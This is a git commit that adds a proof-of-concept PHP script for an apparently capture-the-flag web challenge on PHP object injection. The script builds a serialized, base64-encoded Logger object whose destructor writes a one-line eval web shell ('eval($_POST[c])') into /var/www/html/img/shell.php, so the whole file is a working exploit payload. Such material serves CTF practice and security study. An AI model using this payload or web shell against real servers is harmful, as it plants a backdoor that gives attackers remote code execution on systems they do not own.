eb4ef665e4e19c0b09146f896ed3d6e8c088b5b5
WangYihang <wangyihanger@gmail.com>
2017-06-17 22:52:20 +0800

    [+]web200-php-object-injection

---
+++ web/web200-php-object-injection/poc.php
@@ -0,0 +1,33 @@
+<?php
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+      
+        function __construct($file){
+            // initialise variables
+            $this->initMsg='大佬们 为什么这里 initMsg 写不了呀... 求解...';
+            $this->exitMsg='<?php eval($_POST[c]);?>';
+            $this->logFile = "/var/www/html/img/shell.php";
+      
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$initMsg);
+            fclose($fd);
+        }                       
+      
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }                       
+      
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }                       
+    }
+
+    var_dump(base64_encode(serialize(new Logger("SniperOJ"))));
